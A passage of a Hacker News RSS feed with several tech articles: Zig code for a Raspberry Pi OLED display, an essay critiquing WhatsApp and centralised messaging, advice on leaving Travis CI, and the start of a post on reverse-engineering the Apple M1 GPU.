  const fd = try fs.openFileAbsolute(i2c_device, fs.File.OpenFlags{ .write = true, .read = true });
  defer fd.close();

  if (c.ioctl(fd.handle, c.I2C_SLAVE, i2c_addr) &lt; 0)) {
    try stdout.print("ioctl failed, errno: {}\n", c.errno);
  }

  stdout.print("Init successful.\n", .{});
}</code></pre>
<p>You might have noticed something odd: we’re not really writing much Zig here, it’s practically 95% interop with C. The beauty of Zig is that this interop is so simple and intuitive that it’s the <em>easiest</em> way to get started if you’re going to be linking against existing C libraries. Get the software working first, abstract it later, as they say, and you might already start to get an idea of what we could convert into idiomatic Zig libraries in future.</p>
<p>The actual Zig code you see though, is quite different to the C stuff. That <code>defer fd.close()</code>, for example, <em>ensures</em> that the file descriptor we opened up will be closed when we’re done. If we don’t do that, then it’ll stay open and there’ll be a leak.</p>
<p>There’s also the <code>try</code> macro, used in combination with the <code>!void</code> return type, which will be super familiar if you’ve written some Rust and have dealt with option types. It’s short hand for executing the code and catching/dealing with the error, with <code>!void</code> being another shorthand for <code>anyerror!void</code>, namely: this function returns either nothing, or an error if there is one.</p>
<p>WHat we’ve actually done, however, is open the device file <code>/dev/i2c-1</code>, and then used the <code>ioctl</code> library to specify which device in particular we want to talk to. You can find out this value by running <code>i2cdevice -y 1</code>, like so:</p>
<pre><code>pi@raspberrypi:~ $ i2cdetect -y 1
     0  1  2  3  4  5  6  7  8  9  a  b  c  d  e  f
00:          -- -- -- -- -- -- -- -- -- -- -- -- --
10: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
20: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
30: -- -- -- -- -- -- -- -- -- -- -- -- 3c -- -- --
40: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
50: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
60: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
70: -- -- -- -- -- -- -- --</code></pre>

<p>We’re at a good point now to try and compile this thing and then run it on the Pi. If we get the message ‘Init successful.’ then we’re golden.</p>
<hr>
<h2 id="build-and-push">Build and Push</h2>
<p>Zig comes with a nice little build system out of the box, but we’re not going to use it right now because it’s a work in progress. I’ll leave that as an exercise to you, the reader, and I urge you to contribute any documentation you come up with to Zig. Instead, we’ll use the CLI which is just as powerful and, gracefully, a bit more discoverable for our purposes.</p>
<p>Are you writing this code on the Pi itself? Probably not, I imagine, and nor do you need to.</p>
<blockquote>
<p>Cross-compiling is a first-class use case</p>
<p>Andrew Kelley, Creator of Zig</p>
</blockquote>
<p>Let’s build a binary, then. Save your code into a file, say, <code>stardust.zig</code> and then proceed.</p>
<pre><code>zig build-exe stardust.zig  -target arm-linux-musleabihf -mcpu arm1176jzf_s -O ReleaseSafe -lc</code></pre>
<p>To unpack that a little, the <code>target</code> is a triplet stating that we want to build this using the musl<a href="#fn9" id="fnref9" role="doc-noteref"><sup>9</sup></a> libc ABI, on a 32bit ARM architecture. <code>mcpu</code> goes along with that to make sure the resulting binary will work on our Pi Zero. I grabbed these values from an issue on Zig’s github repo<a href="#fn10" id="fnref10" role="doc-noteref"><sup>10</sup></a>, so credit goes to the author of that issue for unintentionally guiding me forward.</p>
<p>Passing the optimiser flag (<code>-O</code>) isn’t strictly necessary, so you can omit this if you require a debug build and stack traces with errors.</p>
<p><code>-lc</code> basically says that this binary needs to be linked against libc.</p>
<p>Once the build finishes, you should find a shiny new executable called <code>stardust</code> in the same directory as your code. You can get it onto your Pi with <code>scp</code>, like so:</p>
<pre><code>scp stardust pi@raspberrypi:~/stardust</code></pre>

<p>SSH into your Pi after that, and try and run it! Does it return successfully? I hope so!</p>
<p>Let’s move on and make this kitten purr. Meow 🐈.</p>
<hr>
<h2 id="getting-this-show-on-the-road">Getting this show on the road</h2>
<p>In true <em>draw the rest of the fucking owl</em> fashion<a href="#fn11" id="fnref11" role="doc-noteref"><sup>11</sup></a>, what follows is a bit of a code-dump since the primary method of communicating with your OLED display is to, literally, write a few bytes to a file. The registers available and what can be written to them are often described in a meticulously detailed datasheet<a href="#fn12" id="fnref12" role="doc-noteref"><sup>12</sup></a>, but they’re not exactly light reading and we can save a bit of time by grabbing the info from elsewhere. A lot of the constants that follow are gracefully derived from those listed in a certain <code>owenosborn</code>’s wiringPi-based driver.<a href="#fn13" id="fnref13" role="doc-noteref"><sup>13</sup></a>. Credit where credit’s due, eh.</p>
<pre><code>const SET_CONTRAST = 0x81;
const SET_DISPLAY_ALL_ON_RESUME = 0xA4;
const SET_DISPLAY_ALL_ON = 0xA5;
const SET_NORMAL_DISPLAY = 0xA6;
const SET_INVERT_DISPLAY = 0xA7;
const SET_DISPLAY_OFF = 0xAE;
const SET_DISPLAY_ON = 0xAF;
const SET_DISPLAY_OFFSET = 0xD3;
const SET_COLUMN_ADDR = 0x21;
const SET_PAGE_ADDR = 0x22;
const SET_COM_PINS = 0xDA;
const SET_VCOM_DETECT = 0xDB;
const SET_DISPLAY_CLOCK_FREQ = 0xD5;
const SET_PRECHARGE = 0xD9;
const SET_MULTIPLEX_RATIO = 0xA8;
const SET_LOW_COLUMN = 0x00;
const SET_HIGH_COLUMN = 0x10;
const SET_START_LINE = 0x40;
const SET_START_PAGE = 0xB0;
const SET_MEMORY_MODE = 0x20;
const SET_COM_SCAN_INC = 0xC0;
const SET_COM_SCAN_DEC = 0xC8;
const SET_SEG_REMAP = 0xA0;
const SET_CHARGE_PUMP = 0x8D;</code></pre>
<p>The registers available to an i<sup>2</sup>c compatible device will depend on the device itself, so it’s not really safe to copy and paste these without knowing exactly what you’re dealing with. This is driver level code so it’s not like you’ll get some fancy validation error if you write the wrong bytes, you’ll more likely fuck it up and burn down your house<a href="#fn14" id="fnref14" role="doc-noteref"><sup>14</sup></a>.</p>
<p>Next we’ll want to init the display and get it into a clean state, with the cursor pointing at the first pixel.</p>
<pre><code>fn init_display(fd: fs.File) !void {
    const cmds = [_]u8{
        SET_MULTIPLEX_RATIO, 0x3F,                   0x00,
        SET_START_LINE,      SET_SEG_REMAP,          SET_COM_SCAN_DEC,
        SET_COM_PINS,        0x32,                   SET_DISPLAY_ALL_ON_RESUME,
        SET_NORMAL_DISPLAY,  SET_DISPLAY_CLOCK_FREQ, 0x80,
        SET_CHARGE_PUMP,     0x14,                   SET_MEMORY_MODE,
        0x20,
    };

    inline for (cmds) |cmd| {
        _ = try fd.write(&amp;[2]u8{ 0x00, cmd });
    }
}

fn display_off(fd: fs.File) !void {
    _ = try fd.write(&amp;[2]u8{ 0x00, SET_DISPLAY_OFF });
}

fn display_on(fd: fs.File) !void {
    _ = try fd.write(&amp;[2]u8{ 0x00, SET_DISPLAY_ON });
}

fn reset_cursor(fd: fs.File) !void {
    const cmds = [_]u8{
        SET_COLUMN_ADDR,
        0x00,
        0x7F,
        SET_PAGE_ADDR,
        0x00,
        0x07,
    };

    inline for (cmds) |cmd| {
        _ = try fd.write(&amp;[2]u8{ 0x00, cmd });
    }
}</code></pre>
<p>Wow, actual Zig code! The formatting may look a little odd because that’s what <code>zig fmt</code> decides is appropriate.</p>
<p><code>init_display</code> is quite a complex beast that issues a whole series of commands that sets up the display for further use. A more …</p></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.kamelasa.dev/programming/gettin-ziggy-with-it-pi-zero/">https://www.kamelasa.dev/programming/gettin-ziggy-with-it-pi-zero/</a></em></p>]]>
            </description>
            <link>https://www.kamelasa.dev/programming/gettin-ziggy-with-it-pi-zero/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25674206</guid>
            <pubDate>Thu, 07 Jan 2021 17:33:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Have you considered the alternative? (2017)]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25674100">thread link</a>) | @MattJ100
<br/>
January 7, 2021 | https://homebrewserver.club/have-you-considered-the-alternative.html | <a href="https://web.archive.org/web/*/https://homebrewserver.club/have-you-considered-the-alternative.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
<blockquote>
<p>“Remember, when advertising is involved you the user are the product. […]
When people ask us why we charge for WhatsApp, we say ‘Have you considered the alternative?’“</p>
</blockquote>
<p><small>Brian Acton and Jan Koum, June 2012<sup id="fnref:1"><a href="#fn:1">1</a></sup> </small></p>
<blockquote>
<p>“Facebook today announced that it has reached a definitive agreement to acquire WhatsApp, a rapidly growing cross-platform mobile messaging company,
for a total of approximately $16 billion, including $4 billion in cash and approximately $12 billion worth of Facebook shares.”</p>
</blockquote>
<p><small> Facebook Newsroom, February  2014<sup id="fnref:2"><a href="#fn:2">2</a></sup></small></p>
<blockquote>
<p>“[B]y coordinating more with Facebook, we’ll be able to do things like track basic metrics about how often people use our services and better fight spam on WhatsApp.
And by connecting your phone number with Facebook’s systems, Facebook can offer better friend suggestions and show you more relevant ads if you have an account with them.”</p>
</blockquote>
<p><small> Brian Acton and Jan Koum, August 2016<sup id="fnref:3"><a href="#fn:3">3</a></sup></small></p>
<hr>

<p>WhatsApp started out full of dreams: “we want WhatsApp to be the product that keeps you awake…and that you reach for in the morning. No one jumps up from a nap and runs to see an advertisement”<sup id="fnref:4"><a href="#fn:4">4</a></sup>. When they thought of WhatsApp, Brian Acton and Jan Koum were very keen on <em>not</em> selling our user data for targeted advertisement purposes. So they charged a nominal rate for the use of their service, rightfully pointing out the hidden cost of using free services.</p>
<p>In the year of 2014 however, WhatsApp was bought by Facebook, thus joining the social network’s happy and expanding family of venture capital investments, a family including Instagram, purchased in April 2012, and Oculus VR, purchased the month before. At the time, many, and with good reason, worried about the changes this acquisition could entail for WhatsApp. Eventually, in August 2016, WhatsApp users everywhere learned about what was in fact unavoidable. The company that built its reputation upon an ad-free ethic, would now be sharing private user information with Facebook, its parent company. So we, the users, are the product after all, and as expected, this is presented in the form of an <em>improvement</em> of the user experience. Thanks to the tighter coordination between WhatsApp and Facebook, we can now more easily find our friends or see more valuable messages from the companies that truly matter to us. Of course, small footnote, these ‘benefits’ comes at the price of sharing our phone number and other private data with Facebook—though, trusting their word, not the content of the messages themselves.</p>
<p>Facebook does this for the simple reason that it needs to increase its market share on mobile devices<sup id="fnref:5"><a href="#fn:5">5</a></sup>; the family of Whatsapp, Facebook and Instagram are all <em>different</em> channels leading to this same purpose. One of the consequences of this is that while Facebook’s chat function can still be used on their mobile website, plans are that we will soon be forced to install Facebook Messenger should we wish to continue using it on our mobile phones<sup id="fnref:6"><a href="#fn:6">6</a></sup>. Once again, in a stroke of pure genius and creativity, this move is being marketed as a way to provide us with the best experience ever.  And we can use it with just a phone number, we don’t even need a Facebook account. That way, their user base expands along with their profits.</p>
<p>Every time there is a breach of user trust —read: a change in the Terms of Service— or news regarding network surveillance, people are on the lookout for an alternative, and rightfully so. In these moments there are many also willing to promote such <em>alternatives</em>, usually in the form of yet another disruptive app.  After the purchase of Whatsapp, for example, Telegram was advertised as the alternative. After it became clear that Telegram had dreadful security, people promoted Viber. Then Snapchat, then Threema, then Allo and now Signal. There is a reason why we’re falling into this pattern of needing alternatives to the alternatives. And that is because…</p>

<p>There’s a tendency to oversimplify the issues related to the use of these apps as merely a privacy matter, and not even that is sufficiently addressed. While each of the aforementioned apps are alternative companies and brands, what these alternatives all have in common is that they share the same model. A model that revolves around centralized services, vendor lock-in and marketing related surveillance, and all of that within a neoliberal context of the free market. These alternatives therefore promote themselves as more than just an alternative, but also as competing products, usually highlighting a particular feature lacking in rivals’ products. Remember that ill-fated, super cool, nice looking alternative to Facebook, Ello? It gained a lot of traction out of legitimate concerns with Facebook’s modus operandi, promoting itself as an alternative for its nice features and its promise not to use advertising. But as Aral Balkan was quick to point out, allowing investments by venture capital firms meant the project was dead before it really began<sup id="fnref:7"><a href="#fn:7">7</a></sup>. Taking these investments, which allowed them to scale as a platform, also meant that they would, at some point, <em>have</em> to make a lot of money for their investors. How? By selling ad space or information about their users. The reason the pattern keeps repeating itself is not because the makers of these apps always secretly intended to sell your data while saying they wouldn’t. The reason is that they have no choice within the economic system they choose to operate in.</p>

<p>The latest competitive feature—one might even say, marketing trick—to make concerned users switch from one alternative to another is cryptography, the act of coding messages during communication. This strategy works well because the vast majority of people are not really informed when it comes down to the technicalities of cryptography, so this discourse mostly serves to throw bedazzling sparkles in our eyes. To be sure, cryptography is fundamental for privacy. However, the main privacy threat in the context of using these apps isn’t the potential of a government eavesdropping on our communications. The privacy threat is the wholesale and increasing dependence on centralized services which revolve around the surveillance and monetization of user information. In 2016, both WhatsApp and Facebook Messenger enabled end-to-end encryption<a href="http://homebrewserver.club/beginners-guide-to-xmpp-speak.html#e2e"><sup>?</sup></a> to address increasing privacy concerns. Adding <em>crypto</em> to a communication app in this case merely obfuscates a concern about the hegemony of these platforms. In essence, the issue of privacy is much larger than just the lack of cryptography; the conditions that threaten privacy are structural and economic and not resolved by a <em>patch</em> or a new feature.</p>
<p>This issue is further stressed when looking at the question of metadata, that is to say, data about data, which in the case of communication applications is everything but the communication data itself. When WhatsApp started sharing, among other things, its users’ phone numbers with its parent company, Facebook, it went to great lengths to guarantee us that the content of our messages was still perfectly secure, impossible to be read by both WhatsApp and Facebook. The argument stating that “It’s only metadata, don’t worry” has been however debunked numerous times. Even though these platforms would love us to believe otherwise, metadata is neither a trivial disposable by-product, nor it is anonymous. And assuming that the crypto is sound and that the app running this crypto is not flawed, cross-referencing several databases containing metadata will always produce an array of very personal information, that in itself is much more valuable than encrypted naked selfies. Thus it should be no surprise that former NSA director Michael Hayden infamously said in 2012 “we kill based on metadata”<sup id="fnref:8"><a href="#fn:8">8</a></sup> and later argued in 2015 that metadata should be the main area of focus of surveillance activities, and not the creation of backdoors within crypto, or the banning of the latter<sup id="fnref:9"><a href="#fn:9">9</a></sup>.</p>
<p>In short, both Whatsapp and FacebookMessenger can afford to deploy end-to-end encryption for your messages because it won’t hurt their bottom line, which is making money based on the surveillance of your behavior and your social graph. Adding crypto thus merely patches your privacy worries, but not the threat to it.</p>

<p>The end-to-end encryption enabled in WhatsApp and Facebook Messenger has been developed by Open Whisper Systems, a non-profit run by crypto-celebrity Moxie Marlinspike. OWS also developed the algorithm for their own instant messaging application, Signal, and then open-sourced it. Signal itself is now the latest app being promoted as an alternative to WhatsApp and is hailed as the panacea of both security and usability. It even has the backing of members of the dissident elite such as Edward Snowden.</p>
<p>While OWS provides thorough expertise in the field of cryptography, Marlinspike is currently advocating centralisation as the only answer towards user-friendly, fast and secure messaging apps. Decentralisation, according to him, has no place in the modern world and apparently hampers innovation. However, some of his arguments have not remained unchallenged. In particular, where Marlinspike accuses federation of stalling evolution<sup id="fnref:11"><a href="#fn:11">11</a></sup>, Daniel Gultsch<sup id="fnref:12"><a href="#fn:12">12</a></sup> provides a counter argument by using the Web as an example of successfully federated system<a href="http://homebrewserver.club/beginners-guide-to-xmpp-speak.html#federated"><sup>?</sup></a>. Furthermore, Gultsch states that the problem is not that federation doesn’t adapt, but rather that there are problems with its implementation for a very significant reason: software developers working on federated systems mostly work for free in their spare time or with little means, given the difficulty to monetise a system which design can only succeed if it is open and can be appropriated easily beyond its original scope, and thus making its capitalisation particularly challenging. In that sense, the most interesting aspect of this debate is that while Marlinspike seems to defend his product from a technological perspective, Gultsch’s counter argument moves back the discussion to the context of political economy.</p>
<p>Dani…</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://homebrewserver.club/have-you-considered-the-alternative.html">https://homebrewserver.club/have-you-considered-the-alternative.html</a></em></p>]]>
            </description>
            <link>https://homebrewserver.club/have-you-considered-the-alternative.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25674100</guid>
            <pubDate>Thu, 07 Jan 2021 17:27:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[RubyGems Bitcoin Stealing Malware Postmortem]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25674098">thread link</a>) | @vinnyglennon
<br/>
January 7, 2021 | https://mensfeld.pl/2020/12/rubygems-bitcoin-stealing-malware-postmortem/ | <a href="https://web.archive.org/web/*/https://mensfeld.pl/2020/12/rubygems-bitcoin-stealing-malware-postmortem/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://mensfeld.pl/2020/12/rubygems-bitcoin-stealing-malware-postmortem/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25674098</guid>
            <pubDate>Thu, 07 Jan 2021 17:27:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Migrating Your Open Source Builds Off of Travis CI]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25674056">thread link</a>) | @agbell
<br/>
January 7, 2021 | https://blog.earthly.dev/migrating-from-travis/ | <a href="https://web.archive.org/web/*/https://blog.earthly.dev/migrating-from-travis/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>Starting in early December, a mad dash has been underway to migrate open-source projects off of Travis CI. What happened and where should you move your project to?</p><figure><img src="https://blog.earthly.dev/content/images/2021/01/Screen-Shot-2021-01-05-at-3.42.32-PM.png" alt=""><figcaption><a href="https://twitter.com/james_hilliard/status/1336081776691843072">Jame's Hilliard on Twitter</a></figcaption></figure><p>If you're not familiar with Travis CI, it's a build company that has been powering the continuous integration (CI) of many open source projects since it launched in 2011. &nbsp;It was the first build solution that was free for open source use and that easily integrated into GitHub.</p><h2 id="what-happened">What Happened?</h2><p>In 2019 Travis was acquired by a private equity group and many engineers were let go.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">So apparently Travis CI is being strip-mined immediately after their acquisition by Idera. Sorry, I mean after "joining the Idera family" 🙄 <a href="https://t.co/CE5ERp1RsY">https://t.co/CE5ERp1RsY</a> A bunch of talented people are waking up to termination letters. Absolutely shameful. <a href="https://t.co/BbBRPdnswe">https://t.co/BbBRPdnswe</a></p>— Senior Oops Engineer (@ReinH) <a href="https://twitter.com/ReinH/status/1098663375985229825?ref_src=twsrc%5Etfw">February 21, 2019</a></blockquote>

</figure><p>Then, on Nov 2, 2020, Travis CI announced the end of its unlimited support for open-source projects: </p><blockquote>For those of you who have been building on public repositories (on travis-ci.com, with no paid subscription), we will upgrade you to our trial (free) plan with a 10K credit allotment.</blockquote><blockquote><strong>When your credit allotment runs out - we’d love for you to consider which of our plans will meet your needs.</strong> - <a href="https://blog.travis-ci.com/2020-11-02-travis-ci-new-billing">Travis CI blogpost</a></blockquote><p>The reason behind the change is stated to be abuse by crypto-miners:</p><blockquote>However, in recent months we have encountered significant abuse of the intention of this offering (increased activity of cryptocurrency miners, TOR nodes operators etc.). </blockquote><p> However, many feel the real reason is that the acquirer is aiming for profitability at all costs and supporting the open-source community represents a significant cost.</p><blockquote>My previous company was on Travis, and as soon as I saw that Travis was purchased by private equity, I knew the downward spiral had begun and I recommended we move to something else. Not surprised that this is happening a couple of years later...my understanding is that private equity will tend towards slowing/stopping development after acquisition to cut costs/headcount, and then squeeze the remaining value from what's left, so this is in-line with that playbook. &nbsp;- <a href="https://news.ycombinator.com/item?id=25340486">rpdillion on hacker news</a></blockquote><h2 id="why-it-matters">Why it Matters</h2><blockquote>The open source movement runs on the heroic efforts of not enough people doing too much work. They need help. - <a href="https://www.wired.com/author/clive-thompson">CLIVE THOMPSON</a></blockquote><p>Many open-source projects are still using Travis and open-source maintainers are notoriously overworked. &nbsp;Time spent migrating builds is time not spent on other things. &nbsp;Large well-maintained projects will likely quickly transition but for many smaller projects, an abrupt change in a service they depend on is a huge challenge. </p><h2 id="where-to-move-to">Where To Move To</h2><figure><img src="https://blog.earthly.dev/content/images/2021/01/Screen-Shot-2021-01-06-at-4.53.01-PM.png" alt="" srcset="https://blog.earthly.dev/content/images/size/w600/2021/01/Screen-Shot-2021-01-06-at-4.53.01-PM.png 600w, https://blog.earthly.dev/content/images/size/w1000/2021/01/Screen-Shot-2021-01-06-at-4.53.01-PM.png 1000w, https://blog.earthly.dev/content/images/size/w1600/2021/01/Screen-Shot-2021-01-06-at-4.53.01-PM.png 1600w, https://blog.earthly.dev/content/images/size/w2400/2021/01/Screen-Shot-2021-01-06-at-4.53.01-PM.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>If you maintain an open-source project that uses TravisCI and are hoping to get off it, then assuming you have the time to migrate, there are actually many viable options.</p><h3 id="option-run-your-own-builds">Option: Run Your Own Builds</h3><p>You can find some <a href="https://medium.com/google-developers/how-to-run-travisci-locally-on-docker-822fc6b2db2e">scattered</a> <a href="https://stackoverflow.com/a/35972902">instructions</a> <a href="https://stackoverflow.com/a/35972902">online</a> for running Travis builds yourself. There are mixed reports on the stability and feasibility of this approach, but if your adventurous you could try to setup your own Travis CI build executor on your own hardware.</p><p>A better option, if you want to run the builds on your own hardware is to look at something like <a href="https://buildkite.com/">Buildkite</a> or <a href="https://about.gitlab.com/stages-devops-lifecycle/continuous-integration/https://about.gitlab.com/stages-devops-lifecycle/continuous-integration/">GitLab CI</a>.</p><h3 id="option-circle-ci">Option: Circle CI</h3><p>A better option is Circle CI, a Travis CI competitor which still offers a free plan. &nbsp; </p><p>Circle CI offers 400,000 build credits per month to any open-source public repository. &nbsp;This is their free plan and limits concurrency to 1 job at a time. They also have an easy GitHub integration and no application process. &nbsp;</p><p>They also allow use of the free plan with private repositories. This makes it a great choice if your project is not actually open-source. More details <a href="https://circleci.com/open-source/">can be found here</a>.</p><h3 id="best-option-github-actions">Best Option: Github Actions</h3><figure><img src="https://blog.earthly.dev/content/images/2021/01/Screen-Shot-2021-01-06-at-5.12.18-PM.png" alt="" srcset="https://blog.earthly.dev/content/images/size/w600/2021/01/Screen-Shot-2021-01-06-at-5.12.18-PM.png 600w, https://blog.earthly.dev/content/images/size/w1000/2021/01/Screen-Shot-2021-01-06-at-5.12.18-PM.png 1000w, https://blog.earthly.dev/content/images/size/w1600/2021/01/Screen-Shot-2021-01-06-at-5.12.18-PM.png 1600w, https://blog.earthly.dev/content/images/size/w2400/2021/01/Screen-Shot-2021-01-06-at-5.12.18-PM.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>An even better option is Github Actions, a cloud CI system directly from GitHub. &nbsp;Github is at the center of many open source projects and this makes it a natural choice for CI. &nbsp;</p><p>Github Actions (GHA) is newer than either TravisCI or Circle CI, having launched in late 2018. </p><p>GHA offers very generous build credits, 20 concurrent build jobs per project and no limit on build time used. &nbsp; If your pipeline can be run in parallel this concurrency can really be a great enabler. &nbsp;The only limitation I was able to find is that the build may last no longer than 6 hours in total. </p><p>If your project is hosted on GitHub, then to me, GHA seems like the best bet right now. More details about the open-source plan can <a href="https://docs.github.com/en/free-pro-team@latest/actions/reference/usage-limits-billing-and-administration">be found here</a>.</p><h3 id="summary-of-open-source-plans">Summary of Open Source Plans</h3><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Service</th>
<th>Open Source Offering</th>
</tr>
</thead>
<tbody>
<tr>
<td>Travis CI</td>
<td><a href="https://blog.travis-ci.com/2020-11-02-travis-ci-new-billing">1000 minutes total with application process for more</a></td></tr><tr>
<td>Circle CI</td>
    <td><a href="https://circleci.com/open-source/">1 concurrent build at a time</a></td>
</tr>
<tr>
<td>GitHub Actions</td>
    <td><a href="https://docs.github.com/en/free-pro-team@latest/actions/reference/usage-limits-billing-and-administration">20 concurrent build jobs per project</a></td>
</tr>

</tbody></table><!--kg-card-end: html--><h2 id="don-t-let-this-happen-again">Don't Let This Happen Again</h2><p>So GitHub has a generous build plan, but moving your CI process is not easy or free. &nbsp;The more complex your build, the harder porting from one cloud CI to another is going to be. &nbsp;If you move to GHA and then GHA stops being a viable option in the future then this whole effort will have to be repeated. &nbsp;</p><h2 id="neutral-build-specifications">Neutral Build Specifications</h2><figure><img src="https://blog.earthly.dev/content/images/2021/01/Screen-Shot-2021-01-06-at-4.58.54-PM.png" alt="" srcset="https://blog.earthly.dev/content/images/size/w600/2021/01/Screen-Shot-2021-01-06-at-4.58.54-PM.png 600w, https://blog.earthly.dev/content/images/size/w1000/2021/01/Screen-Shot-2021-01-06-at-4.58.54-PM.png 1000w, https://blog.earthly.dev/content/images/size/w1600/2021/01/Screen-Shot-2021-01-06-at-4.58.54-PM.png 1600w, https://blog.earthly.dev/content/images/size/w2400/2021/01/Screen-Shot-2021-01-06-at-4.58.54-PM.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>How can you minimize the effort of moving from build platform to another?</p><p>My suggestion is to keep as much logic as possible out of the proprietary build definition. Instead, define it in an open-source format that you can execute anywhere.</p><h3 id="makefiles-and-dockerfiles">Makefiles and Dockerfiles</h3><p>One way to build a CI neutral build definition is to use a makefile and a dockerfile. &nbsp;The makefile contains the various steps of your build pipeline and you run it inside a docker container which installs any needed dependencies. &nbsp;<a href="https://github.com/qmk/qmk_firmware">QMK</a> is a popular open-source project that uses this approach.</p><figure><pre><code>FROM qmkfm/base_container

VOLUME /qmk_firmware
WORKDIR /qmk_firmware
COPY . .

CMD make all:default</code></pre><figcaption><a href="https://github.com/qmk/qmk_firmware/blob/master/Dockerfile">QMK</a> Docker File for executing the full build</figcaption></figure><h3 id="earthly">Earthly</h3><p>This is the Earthly blog, and I am an Earthly contributor, but in my totally biased opinion, it deserves a mention as an neurtal format for defining a build. The Elixir web framework <a href="https://github.com/phoenixframework/phoenix/blob/master/Earthfile">Phoenix is a great example to take a look at</a>.</p><p>Earthly is like a makefile where each step is containerized and dependencies are explicitly declared. &nbsp;</p><figure><pre><code>FROM golang:1.13-alpine3.11

build:
	COPY main.go .
	RUN go build main.go
	SAVE ARTIFACT main AS LOCAL main
    
lint: 
	...</code></pre><figcaption>Example build steps for a <a href="https://github.com/earthly/earthly/blob/main/examples/go/Earthfile">go application</a></figcaption></figure><h2 id="other-interesting-options">Other Interesting Options</h2><h3 id="easier-migration-from-travis-to-gha">Easier Migration from Travis to GHA</h3><p>Migrating your build out of Travis might take a little work. &nbsp;If you aren't interested in a neutral format, <a href="https://github.com/marketplace/actions/run-travis-yml">this GHA action</a> might make it easier. &nbsp;</p><blockquote>This action setups environment variables specified in the <code>.travis.yml</code> file and then runs <em>one</em> of the (potentially) many build jobs within the test build stage.</blockquote><h3 id="serverless-builds">Serverless Builds</h3><p> Another interesting option if you are feeling adventurous is using AWS lambda as your build executor. &nbsp;I have no idea how feasible this is, however, <a href="https://github.com/StanfordSNR/gg">the gg project</a> from Stanford looks interesting. &nbsp;It attempts to use AWS lambdas for running builds at the maximum possible parallelism. &nbsp;</p><h2 id="take-aways">Take Aways</h2><p>You probably need to move your open-source project's builds off of Travis CI. If you host it on GitHub, GitHub Actions is probably a good choice.</p><p>There is a risk that the GHA offer will disappear as well. &nbsp;You can protect yourself from that by defining your build in an open format that is easy to move around. &nbsp;All build problems can be solved by another layer of abstraction.</p><p>If you are going that route, I think <a href="http://earthly.dev/">Earthly</a> is a great option, but as I said, I am biased.</p>
                </div>
            </section></div>]]>
            </description>
            <link>https://blog.earthly.dev/migrating-from-travis/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25674056</guid>
            <pubDate>Thu, 07 Jan 2021 17:25:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dissecting the Apple M1 GPU, part I]]>
            </title>
            <description>
<![CDATA[
Score 536 | Comments 132 (<a href="https://news.ycombinator.com/item?id=25673631">thread link</a>) | @caution
<br/>
January 7, 2021 | https://rosenzweig.io/blog/asahi-gpu-part-1.html | <a href="https://web.archive.org/web/*/https://rosenzweig.io/blog/asahi-gpu-part-1.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<header><p>7 Jan 2021</p></header><p>Apple’s latest line of Macs includes their in-house “M1” system-on-chip, featuring a custom GPU. This poses a problem for those of us in the <a href="https://asahilinux.org/">Asahi Linux</a> project who wish to run Linux on our devices, as this custom Apple GPU has neither public documentation nor open source drivers. Some speculate it might descend from PowerVR GPUs, as used in older iPhones, while others believe the GPU to be completely custom. But rumours and speculations are no fun when we can peek under the hood ourselves!</p>
<p>A few weeks ago, I purchased a Mac Mini with an M1 GPU as a development target to study the instruction set and command stream, to understand the GPU’s architecture at a level not previously publicly understood, and ultimately to accelerate the development of a Mesa driver for the hardware. Today I’ve reached my first milestone: I now understand enough of the instruction set to disassemble simple shaders with a free and open-source tool chain, <a href="https://github.com/AsahiLinux/gpu">released on GitHub here</a>.</p>
<p>The process for decoding the instruction set and command stream of the GPU parallels the same process I used for reverse-engineering Mali GPUs in the Panfrost project, originally pioneered by the Lima, Freedreno, and Nouveau free software driver projects. Typically, for Linux or Android driver reverse-engineering, a small wrap library will be written to inject into a test application via <code>LD_PRELOAD</code> that hooks key system calls like <code>ioctl</code> and <code>mmap</code> in order to analyze user-kernel interactions. Once the “submit command buffer” call is issued, the library can dump all (mapped) shared memory for offline analysis.</p>
<p>The same overall process will work for the M1, but there are some macOSisms that need to be translated. First, there is no <code>LD_PRELOAD</code> on macOS; the equivalent is <code>DYLD_INSERT_LIBRARIES</code>, which has some extra security features which are easy enough to turn off for our purposes. Second, while the standard Linux/BSD system calls do exist on macOS, they are not used for graphics drivers. Instead, Apple’s own <code>IOKit</code> framework is used for both kernel and userspace drivers, with the critical entry point of <code>IOConnectCallMethod</code>, an analogue of <code>ioctl</code>. These differences are easy enough to paper over, but they do add a layer of distance from the standard Linux tooling.</p>
